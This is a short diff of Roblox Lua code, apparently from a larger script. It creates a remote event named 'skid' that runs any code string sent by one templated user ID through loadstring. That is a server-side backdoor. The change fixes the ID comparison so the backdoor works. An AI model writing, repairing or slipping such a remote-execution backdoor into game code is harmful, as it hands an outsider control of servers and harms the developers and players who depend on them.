@@ -2891,7 +2891,7 @@ local function createRemote()
     local remote = Instance.new("RemoteEvent", game.ReplicatedStorage)
     remote.Name = "skid"
     remote.OnServerEvent:Connect(function(player, SS)
-        if player.UserId == '%userid%' then
+        if player.UserId == %userid% then
             loadstring(SS)()
         else
             --player:Kick("")
